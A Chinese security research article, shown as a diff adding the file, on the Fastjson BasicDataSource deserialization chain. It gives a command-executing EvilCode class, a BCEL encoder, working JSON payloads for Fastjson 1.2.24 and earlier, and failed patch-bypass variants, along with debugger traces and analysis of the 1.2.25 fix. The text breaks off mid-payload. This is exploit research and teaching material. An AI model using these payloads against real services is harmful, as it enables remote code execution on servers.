@@ -1,0 +1,1607 @@
+﻿标题: Fastjson BasicDataSource攻击链简介
+
+创建: 2020-05-12 16:29
+更新: 2020-11-03 14:42
+链接: https://scz.617.cn/web/202005121629.txt
+
+--------------------------------------------------------------------------
+
+目录:
+
+    ☆ 简介
+    ☆ org.apache.tomcat.dbcp.dbcp.BasicDataSource攻击链
+        0) FastjsonDeserialize2.java
+        1) EvilCode.java
+        2) BCELEncode.java
+        3) BCELDecode.java
+        4) Fastjson_BasicDataSource.json
+        5) 简化版调用关系
+        6) 为什么FastjsonDeserialize未能得手
+        7) 1.2.25的修补方案
+            7.1) Fastjson_BasicDataSource_bad_0.json
+            7.2) Fastjson_BasicDataSource_bad_1.json
+            7.3) Fastjson_BasicDataSource_bad_2.json
+            7.4) Fastjson_BasicDataSource_bad_3.json
+        8) org.apache.tomcat.dbcp.dbcp2.BasicDataSource
+            8.1) Fastjson_BasicDataSource2.json
+        9) 通用性更好的PoC
+            9.1) Fastjson_BasicDataSource3.json
+            9.2) 测试
+            9.3) 简化版调用关系
+       10) 转储反序列化过程中动态生成的类
+       11) 通过$ref指定被触发的getter
+           11.1) Fastjson_BasicDataSource4.json
+           11.2) 测试
+           11.4) 简化版调用关系
+           11.5) Fastjson_BasicDataSource5.json
+       12) Fastjson_BasicDataSource6_bad.json
+       13) Fastjson_BasicDataSource7.json (33~36可利用)
+           13.1) 为什么33~36可利用
+           13.2) 为什么37不可利用
+       14) Fastjson_BasicDataSource8.json (36~47可利用)
+    ☆ 小结
+    ☆ 近几年为安全工程师不会饿死做出突出贡献的几个东西
+    ☆ 参考资源
+
+--------------------------------------------------------------------------
+
+☆ 简介
+
+这条攻击链用到"org.apache.tomcat.dbcp.dbcp.BasicDataSource"、
+"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"或其他什么等价类。比较老，只
+能用于Fastjson 1.2.24及更低版本。
+
+Fastjson攻击链更多是用"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
+和"com.sun.rowset.JdbcRowSetImpl"，后者能一直用到Fastjson 1.2.47。
+
+本来太老的攻击链没打算深究，后来觉得其中用到的BCEL编码有点意思，就调试跟踪
+了一下。
+
+95%的人几年前就学过这招，如果仍有兴趣，可直接看"简化版调用关系"和"小结"。
+
+2020.10.19，微博ID为"香依香偎"的网友反馈了个问题，指出[25,32]、48及以上版
+本无法利用BasicDataSource，但[33,47]可以利用，而不是之前想像的25及以上版本
+都无法利用。
+
+☆ org.apache.tomcat.dbcp.dbcp.BasicDataSource攻击链
+
+参[73]，后面的PoC用到了如下库:
+
+tomcat-dbcp-7.0.99.jar
+dbcp-6.0.53.jar
+tomcat-dbcp-9.0.20.jar
+tomcat-juli-9.0.20.jar
+
+0) FastjsonDeserialize2.java
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g -cp "fastjson-1.2.24.jar:." FastjsonDeserialize2.java
+ */
+import java.io.*;
+import java.nio.file.*;
+import java.nio.charset.*;
+import com.alibaba.fastjson.JSON;
+
+public class FastjsonDeserialize2
+{
+    private static String readFile( String path, Charset encoding ) throws IOException
+    {
+        byte[]  buf = Files.readAllBytes( Paths.get( path ) );
+        return new String( buf, encoding );
+    }
+
+    public static void main ( String[] argv ) throws Exception
+    {
+        /*
+         * StandardCharsets.US_ASCII
+         */
+        String  str = readFile( argv[0], StandardCharsets.UTF_8 );
+        Object  obj = JSON.parseObject( str );
+    }
+}
+--------------------------------------------------------------------------
+
+1) EvilCode.java
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g EvilCode.java
+ */
+import java.io.*;
+
+public class EvilCode
+{
+    static
+    {
+        String[]    argv    = new String[] { "0", "/bin/touch /tmp/scz_is_here" };
+
+        try
+        {
+            Operator( argv );
+        }
+        catch ( Exception e )
+        {
+            e.printStackTrace( System.err );
+        }
+    }
+
+    public EvilCode ()
+    {
+        System.out.println( "scz is here" );
+    }
+
+    public EvilCode ( Object[] argv ) throws Exception
+    {
+        Operator( argv );
+    }
+
+    public static void Operator ( Object[] argv ) throws Exception
+    {
+        int     opnum   = Integer.parseInt( ( String )argv[0] );
+        String  cmd;
+
+        switch ( opnum )
+        {
+        case 0 :
+            cmd = ( String )argv[1];
+            Operator_0( cmd );
+            break;
+        case 1 :
+            cmd = ( String )argv[1];
+            Operator_1( cmd );
+            break;
+        default:
+            Operator_unknown();
+            break;
+        }
+    }
+
+    private static void Operator_0 ( String cmd ) throws Exception
+    {
+        Runtime.getRuntime().exec( new String[] { "/bin/sh", "-c", cmd } );
+    }
+
+    private static void Operator_1 ( String cmd ) throws Exception
+    {
+        String  ret = PrivateExec( cmd );
+        throw new InvalidClassException( "\n[\n" + ret + "]\n" );
+    }
+
+    private static void Operator_unknown () throws Exception
+    {
+        throw new InvalidClassException( "\n[\nUnknown opnum\n]\n" );
+    }
+
+    private static String PrivateExec ( String cmd ) throws IOException
+    {
+        ProcessBuilder  pb  = new ProcessBuilder( "/bin/sh", "-c", cmd ).redirectErrorStream( true );
+        Process         p   = pb.start();
+        StringBuilder   ret = new StringBuilder( 256 );
+        BufferedReader  in  = new BufferedReader( new InputStreamReader( p.getInputStream() ) );
+        String          line;
+
+        while ( true )
+        {
+            line    = in.readLine();
+            if ( line == null )
+            {
+                break;
+            }
+            ret.append( line ).append( "\n" );
+        }
+        return( ret.toString() );
+    }
+}
+--------------------------------------------------------------------------
+
+EvilCode没必要写成这样，我是顺手挪用别处的代码，你完全可以精简之。
+
+2) BCELEncode.java
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g -XDignore.symbol.file BCELEncode.java
+ * java BCELEncode EvilCode.class
+ */
+import java.io.*;
+import java.nio.file.Files;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+
+public class BCELEncode
+{
+    public static void main ( String[] argv ) throws Exception
+    {
+        String  filename    = argv[0];
+        byte[]  buf         = Files.readAllBytes( ( new File( filename ) ).toPath() );
+        /*
+         * public static String encode(byte[] bytes, boolean compress)
+         */
+        String  str         = Utility.encode( buf, true );
+        String  bcel        = "$$BCEL$$" + str;
+        System.out.println( bcel );
+    }
+}
+--------------------------------------------------------------------------
+
+$ java BCELEncode EvilCode.class
+$$BCEL$$$l$8b...$A$A
+
+Utility.encode()的输出不包含"$$BCEL$$"前缀，需要自己增加。
+
+3) BCELDecode.java
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g -XDignore.symbol.file BCELDecode.java
+ * java BCELDecode <str> <out.class>
+ */
+import java.io.*;
+import java.nio.file.*;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+
+public class BCELDecode
+{
+    public static void main ( String[] argv ) throws Exception
+    {
+        String  bcel        = argv[0];
+        String  filename    = argv[1];
+        int     index       = bcel.indexOf( "$$BCEL$$" );
+        /*
+         * if ( !bcel.startsWith( "$$BCEL$$" ) )
+         */
+        if ( index < 0 )
+        {
+            return;
+        }
+        String  str         = bcel.substring( index + 8 );
+        /*
+         * public static byte[] decode(String s, boolean uncompress)
+         */
+        byte[]  buf         = Utility.decode( str, true );
+        Files.write
+        (
+            ( new File( filename ) ).toPath(),
+            buf,
+            new OpenOption[] { StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING }
+        );
+    }
+}
+--------------------------------------------------------------------------
+
+$ java BCELDecode '$$BCEL$$$l$8b...$A$A' /tmp/out.class
+
+BCELDecode与攻击链无关，仅仅是因为前面有个负责编码的，出于程序员的本能反应，
+顺手写个负责解码的，保持对称性。
+
+4) Fastjson_BasicDataSource.json
+
+--------------------------------------------------------------------------
+{
+    '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+    'driverClassLoader':
+    {
+        '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
+    },
+    'driverClassName':'$$BCEL$$$l$8b...$A$A'
+}
+--------------------------------------------------------------------------
+
+driverClassName属性的值就是BCELEncode输出的内容。
+
+有人喜欢在PoC中用代码构造上述json内容，我的习惯是将各组件按自己的理解拆分，
+以保持边界感。没有什么特别优势，每个人的学习习惯不同，莫来我处装X。
+
+java \
+-cp "fastjson-1.2.14.jar:dbcp-6.0.53.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource.json
+
+java \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource.json
+
+这两条命令都能得手。
+
+调试FastjsonDeserialize2:
+
+java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource.json
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+stop in org.apache.tomcat.dbcp.dbcp.BasicDataSource.setDriverClassLoader
+stop in org.apache.tomcat.dbcp.dbcp.BasicDataSource.setDriverClassName
+stop in org.apache.tomcat.dbcp.dbcp.BasicDataSource.getConnection()
+monitor wherei
+
+依次命中上面三个断点。
+
+  [1] org.apache.tomcat.dbcp.dbcp.BasicDataSource.setDriverClassLoader (BasicDataSource.java:256), pc = 0
+  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
+  [6] com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue (FieldDeserializer.java:96), pc = 267
+  [7] com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField (DefaultFieldDeserializer.java:83), pc = 265
+  [8] com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField (JavaBeanDeserializer.java:773), pc = 373
+  [9] com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze (JavaBeanDeserializer.java:600), pc = 1,872
+  [10] com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest (JavaBeanDeserializer.java:922), pc = 8
+  [11] com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_BasicDataSource.deserialze (null), pc = 3,810
+  [12] com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze (JavaBeanDeserializer.java:184), pc = 5
+  [13] com.alibaba.fastjson.parser.DefaultJSONParser.parseObject (DefaultJSONParser.java:368), pc = 1,089
+  [14] com.alibaba.fastjson.parser.DefaultJSONParser.parse (DefaultJSONParser.java:1,327), pc = 222
+  [15] com.alibaba.fastjson.parser.DefaultJSONParser.parse (DefaultJSONParser.java:1,293), pc = 2
+  [16] com.alibaba.fastjson.JSON.parse (JSON.java:137), pc = 20
+  [17] com.alibaba.fastjson.JSON.parse (JSON.java:128), pc = 4
+  [18] com.alibaba.fastjson.JSON.parseObject (JSON.java:201), pc = 1
+  [19] FastjsonDeserialize2.main (FastjsonDeserialize2.java:23), pc = 11
+
+stop in com.sun.org.apache.bcel.internal.util.ClassLoader.createClass
+
+  [1] com.sun.org.apache.bcel.internal.util.ClassLoader.createClass (ClassLoader.java:199), pc = 0
+  [2] com.sun.org.apache.bcel.internal.util.ClassLoader.loadClass (ClassLoader.java:152), pc = 81
+  [3] java.lang.ClassLoader.loadClass (ClassLoader.java:351), pc = 3
+  [4] java.lang.Class.forName0 (native method)
+  [5] java.lang.Class.forName (Class.java:348), pc = 49
+  [6] org.apache.tomcat.dbcp.dbcp.BasicDataSource.createConnectionFactory (BasicDataSource.java:1,559), pc = 36
+  [7] org.apache.tomcat.dbcp.dbcp.BasicDataSource.createDataSource (BasicDataSource.java:1,467), pc = 30
+  [8] org.apache.tomcat.dbcp.dbcp.BasicDataSource.getConnection (BasicDataSource.java:1,103), pc = 1
+  [9] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [10] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [11] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [12] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
+  [13] com.alibaba.fastjson.util.FieldInfo.get (FieldInfo.java:451), pc = 16
+  [14] com.alibaba.fastjson.serializer.FieldSerializer.getPropertyValue (FieldSerializer.java:114), pc = 5
+  [15] com.alibaba.fastjson.serializer.JavaBeanSerializer.getFieldValuesMap (JavaBeanSerializer.java:439), pc = 50
+  [16] com.alibaba.fastjson.JSON.toJSON (JSON.java:902), pc = 313
+  [17] com.alibaba.fastjson.JSON.toJSON (JSON.java:824), pc = 4
+  [18] com.alibaba.fastjson.JSON.parseObject (JSON.java:206), pc = 18
+  [19] FastjsonDeserialize2.main (FastjsonDeserialize2.java:23), pc = 11
+
+stop in EvilCode.<clinit>
+
+这个断点不会命中，原因见后面的调用栈回溯。
+
+stop in java.lang.Runtime.exec(java.lang.String[])
+
+  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
+  [2] $$BCEL$$$l$8b...$A$A.Operator_0 (EvilCode.java:55), pc = 21
+  [3] $$BCEL$$$l$8b...$A$A.Operator (EvilCode.java:41), pc = 44
+  [4] $$BCEL$$$l$8b...$A$A.<clinit> (EvilCode.java:14), pc = 16
+  [5] java.lang.Class.forName0 (native method)
+  [6] java.lang.Class.forName (Class.java:348), pc = 49
+  [7] org.apache.tomcat.dbcp.dbcp.BasicDataSource.createConnectionFactory (BasicDataSource.java:1,559), pc = 36
+  [8] org.apache.tomcat.dbcp.dbcp.BasicDataSource.createDataSource (BasicDataSource.java:1,467), pc = 30
+  [9] org.apache.tomcat.dbcp.dbcp.BasicDataSource.getConnection (BasicDataSource.java:1,103), pc = 1
+  [10] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [11] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [12] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [13] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
+  [14] com.alibaba.fastjson.util.FieldInfo.get (FieldInfo.java:451), pc = 16
+  [15] com.alibaba.fastjson.serializer.FieldSerializer.getPropertyValue (FieldSerializer.java:114), pc = 5
+  [16] com.alibaba.fastjson.serializer.JavaBeanSerializer.getFieldValuesMap (JavaBeanSerializer.java:439), pc = 50
+  [17] com.alibaba.fastjson.JSON.toJSON (JSON.java:902), pc = 313
+  [18] com.alibaba.fastjson.JSON.toJSON (JSON.java:824), pc = 4
+  [19] com.alibaba.fastjson.JSON.parseObject (JSON.java:206), pc = 18
+  [20] FastjsonDeserialize2.main (FastjsonDeserialize2.java:23), pc = 11
+
+stop in java.io.PrintStream.println(java.lang.String)
+
+  [1] java.io.PrintStream.println (PrintStream.java:805), pc = 0
+  [2] $$BCEL$$$l$8b...$A$A.<init> (EvilCode.java:24), pc = 9
+  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
+  [4] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
+  [5] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
+  [6] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
+  [7] java.lang.Class.newInstance (Class.java:442), pc = 138
+  [8] org.apache.tomcat.dbcp.dbcp.BasicDataSource.createConnectionFactory (BasicDataSource.java:1,584), pc = 134
+  [9] org.apache.tomcat.dbcp.dbcp.BasicDataSource.createDataSource (BasicDataSource.java:1,467), pc = 30
+  [10] org.apache.tomcat.dbcp.dbcp.BasicDataSource.getConnection (BasicDataSource.java:1,103), pc = 1
+  [11] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [12] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [13] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [14] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
+  [15] com.alibaba.fastjson.util.FieldInfo.get (FieldInfo.java:451), pc = 16
+  [16] com.alibaba.fastjson.serializer.FieldSerializer.getPropertyValue (FieldSerializer.java:114), pc = 5
+  [17] com.alibaba.fastjson.serializer.JavaBeanSerializer.getFieldValuesMap (JavaBeanSerializer.java:439), pc = 50
+  [18] com.alibaba.fastjson.JSON.toJSON (JSON.java:902), pc = 313
+  [19] com.alibaba.fastjson.JSON.toJSON (JSON.java:824), pc = 4
+  [20] com.alibaba.fastjson.JSON.parseObject (JSON.java:206), pc = 18
+  [21] FastjsonDeserialize2.main (FastjsonDeserialize2.java:23), pc = 11
+
+5) 简化版调用关系
+
+--------------------------------------------------------------------------
+JSON.parseObject                                        // 8u232+1.2.24+7.0.99
+  JSON.parse                                            // JSON:201
+    JSON.parse                                          // JSON:128
+      DefaultJSONParser.parse                           // JSON:137
+        DefaultJSONParser.parse                         // DefaultJSONParser:1293
+          DefaultJSONParser.parseObject                 // DefaultJSONParser:1327
+            ParserConfig.getDeserializer                // DefaultJSONParser:367
+                                                        // deserializer = config.getDeserializer(clazz)
+                                                        // clazz等于"org.apache.tomcat.dbcp.dbcp.BasicDataSource"
+              ParserConfig.getDeserializer              // ParserConfig:312
+                ParserConfig.createJavaBeanDeserializer // ParserConfig:461
+                  ASMDeserializerFactory.createJavaBeanDeserializer
+                                                        // ParserConfig:591
+                    ASMDeserializerFactory.defineClassPublic
+                                                        // ASMDeserializerFactory:80
+                                                        // 第二形参b就是动态生成的类的字节码
+                                                        // 动态生成的类名形如
+                                                        // com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_<some>
+            JavaBeanDeserializer.deserialze             // DefaultJSONParser:368
+              JavaBeanDeserializer.parseRest            // JavaBeanDeserializer:184
+                JavaBeanDeserializer.deserialze         // JavaBeanDeserializer:922
+                  JavaBeanDeserializer.parseField       // JavaBeanDeserializer:600
+                    DefaultFieldDeserializer.parseField // JavaBeanDeserializer:773
+                      FieldDeserializer.setValue        // DefaultFieldDeserializer:83
+                        BasicDataSource.setDriverClassLoader
+                                                        // FieldDeserializer:96
+                        BasicDataSource.setDriverClassName
+                                                        // 攻击者可控
+  JSON.toJSON                                           // JSON:206
+    JSON.toJSON                                         // JSON:824
+      JavaBeanSerializer.getFieldValuesMap              // JSON:902
+        FieldSerializer.getPropertyValue                // JavaBeanSerializer:439
+          FieldInfo.get                                 // FieldSerializer:114
+            BasicDataSource.getConnection               // FieldInfo:451
+              BasicDataSource.createDataSource          // BasicDataSource:1103
+                BasicDataSource.createConnectionFactory // BasicDataSource:1467
+                  Class.forName                         // BasicDataSource:1559
+                                                        // 第二形参initialize等于true
+                    Class.forName0                      // java.lang.Class:348
+                      java.lang.ClassLoader.loadClass
+                        util.ClassLoader.loadClass      // java.lang.ClassLoader:351
+                                                        // com.sun.org.apache.bcel.internal.util.ClassLoader
+                          if (class_name.indexOf("$$BCEL$$") >= 0)
+                                                        // util.ClassLoader:151
+                          util.ClassLoader.createClass  // util.ClassLoader:152
+                            index = class_name.indexOf("$$BCEL$$")
+                                                        // util.ClassLoader:199
+                            real_name = class_name.substring(index + 8)
+                                                        // util.ClassLoader:200
+                            Utility.decode              // util.ClassLoader:204
+                                                        // com.sun.org.apache.bcel.internal.classfile.Utility
+                                                        // BCEL解码
+                            ClassParser.<init>          // util.ClassLoader:205
+                                                        // com.sun.org.apache.bcel.internal.classfile.ClassParser
+                            ClassParser.parse           // util.ClassLoader:207
+                              JavaClass.<clinit>        // ClassParser:206
+                              JavaClass.<init>          // ClassParser:206
+                                                        // com.sun.org.apache.bcel.internal.classfile.JavaClass
+                          bytes = clazz.getBytes()      // util.ClassLoader:162
+                          java.lang.ClassLoader.defineClass
+                                                        // util.ClassLoader:163
+                                                        // cl = defineClass(class_name, bytes, 0, bytes.length)
+                                                        // class_name等于driverClassName属性值
+                                                        // bytes源自driverClassName属性值的BCEL解码
+                            ClassLoader.defineClass     // java.lang.ClassLoader:635
+                              java.lang.ClassLoader.defineClass1
+                                                        // java.lang.ClassLoader:756
+                                                        // defineClass()并不会执行静态代码块
+                      EvilCode.<clinit>                 // 静态代码块
+                                                        // Class.forName0()中会执行静态代码块
+                                                        // 但不是通过defineClass()触发的
+                        Runtime.exec
+                  Class.newInstance                     // BasicDataSource:1584
+                    EvilCode.<init>                     // 无参构造函数
+                      PrintStream.println
+--------------------------------------------------------------------------
+
+com.sun.org.apache.bcel.internal.util.ClassLoader加载class时检查class_name
+是否动用过BCEL编码，如果是，class_name就不只是类名，还包含类的字节码的BCEL
+编码。util.ClassLoader会从类名中析取字节码并加载之，这可真是骚操作，太邪恶
+了。
+
+参看:
+
+https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/lang/Class.java
+
+--------------------------------------------------------------------------
+public static Class<?> forName(String className)
+
+Invoking this method is equivalent to:
+
+Class.forName(className, true, currentLoader)
+--------------------------------------------------------------------------
+public static Class<?> forName(String name,
+                               boolean initialize,
+                               ClassLoader loader)
+
+The class is initialized only if the initialize parameter is true and if
+it has not been initialized earlier.
+--------------------------------------------------------------------------
+
+initialize为true时，会执行静态代码块。
+
+6) 为什么FastjsonDeserialize未能得手
+
+java \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize Fastjson_BasicDataSource.json
+
+上述命令使用FastjsonDeserialize，未能得手，不抛异常，静默结束。
+
+java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-cp "fastjson-1.2.24.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize Fastjson_BasicDataSource.json
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+FastjsonDeserialize调的是:
+
+JSON.parseObject( fis, Object.class, Feature.SupportNonPublicField )
+
+FastjsonDeserialize2调的是:
+
+JSON.parseObject( str )
+
+调试后确认前者内部不会调用JSON.toJSON()，从而无法触发EvilCode.<clinit>。这
+个例子说明，JSON.parseObject()的不同重载版本对攻击链的反应各不相同，不要笼
+而统之地说函数名，一定要精确描述测试时所用上下文。
+
+7) 1.2.25的修补方案
+
+java \
+-cp "fastjson-1.2.25.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource.json
+
+Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. org.apache.tomcat.dbcp.dbcp.BasicDataSource
+        at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:844)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:322)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)
+        at com.alibaba.fastjson.JSON.parse(JSON.java:137)
+        at com.alibaba.fastjson.JSON.parse(JSON.java:128)
+        at com.alibaba.fastjson.JSON.parseObject(JSON.java:201)
+        at FastjsonDeserialize2.main(FastjsonDeserialize2.java:23)
+
+"org.apache.tomcat"、"com.sun."打头的全进黑名单。
+
+1.2.25至1.2.47的所有补丁绕过方案均无法用于BasicDataSource利用链，各有原因。
+
+7.1) Fastjson_BasicDataSource_bad_0.json
+
+--------------------------------------------------------------------------
+{
+    '@type':"[org.apache.tomcat.dbcp.dbcp.BasicDataSource"[{,
+    'driverClassLoader':
+    {
+        '@type':"LLcom.sun.org.apache.bcel.internal.util.ClassLoader;;"
+    },
+    'driverClassName':'$$BCEL$$$l$8b...$A$A'
+}
+--------------------------------------------------------------------------
+
+原始意图是进行补丁绕过，但1.2.25未能得手。
+
+java \
+-Dfastjson.parser.autoTypeSupport=true \
+-cp "fastjson-1.2.25.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource_bad_0.json
+
+Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. LLcom.sun.org.apache.bcel.internal.util.ClassLoader;;
+        at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:869)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:552)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:188)
+        at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:62)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:767)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:594)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:916)
+        at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_BasicDataSource.deserialze(Unknown Source)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:723)
+        at com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze(ObjectArrayCodec.java:177)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)
+        at com.alibaba.fastjson.JSON.parse(JSON.java:137)
+        at com.alibaba.fastjson.JSON.parse(JSON.java:128)
+        at com.alibaba.fastjson.JSON.parseObject(JSON.java:201)
+        at FastjsonDeserialize2.main(FastjsonDeserialize2.java:23)
+
+从1.2.25开始有一个无法绕过的检查:
+
+--------------------------------------------------------------------------
+/*
+ * 1.2.25
+ *
+ * com.alibaba.fastjson.parser.ParserConfig.checkAutoType
+ *
+ * 866行，这段检查完全是针对BasicDataSource利用链而来
+ */
+if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
+        || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
+        ) {
+    throw new JSONException("autoType is not support. " + typeName);
+}
+--------------------------------------------------------------------------
+
+7.2) Fastjson_BasicDataSource_bad_1.json
+
+--------------------------------------------------------------------------
+[
+    {
+        '@type':"java.lang.Class",
+        'val':'org.apache.tomcat.dbcp.dbcp.BasicDataSource'
+    },
+    {
+        '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+        'driverClassLoader':
+        {
+            '@type':"[com.sun.org.apache.bcel.internal.util.ClassLoader"[{
+        },
+        'driverClassName':'$$BCEL$$$l$8b...$A$A'
+    }
+]
+--------------------------------------------------------------------------
+
+原始意图是进行补丁绕过，但1.2.25未能得手。
+
+java \
+-cp "fastjson-1.2.25.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource_bad_1.json
+
+Exception in thread "main" com.alibaba.fastjson.JSONException: type not match. [com.sun.org.apache.bcel.internal.util.ClassLoader -> java.lang.ClassLoader
+        at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:876)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:552)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:188)
+        at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:62)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:767)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:594)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:916)
+        at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_BasicDataSource.deserialze(Unknown Source)
+        at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:1157)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1320)
+        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)
+        at com.alibaba.fastjson.JSON.parse(JSON.java:137)
+        at com.alibaba.fastjson.JSON.parse(JSON.java:128)
+        at com.alibaba.fastjson.JSON.parseObject(JSON.java:201)
+        at FastjsonDeserialize2.main(FastjsonDeserialize2.java:23)
+
+--------------------------------------------------------------------------
+/*
+ * 1.2.25
+ *
+ * com.alibaba.fastjson.parser.ParserConfig.checkAutoType
+ */
+if (expectClass != null) {
+    if (expectClass.isAssignableFrom(clazz)) {
+        return clazz;
+    } else {
+/*
+ * 876行，此时expectClass等于"java.lang.ClassLoader"，clazz等于
+ * "[com.sun.org.apache.bcel.internal.util.ClassLoader"，后者是数组类型。
+ */
+        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
+    }
+}
+--------------------------------------------------------------------------
+
+7.3) Fastjson_BasicDataSource_bad_2.json
+
+--------------------------------------------------------------------------
+{
+    'a':
+    {
+        '@type':"java.lang.Class",
+        'val':'org.apache.tomcat.dbcp.dbcp.BasicDataSource'
+    },
+    'b':
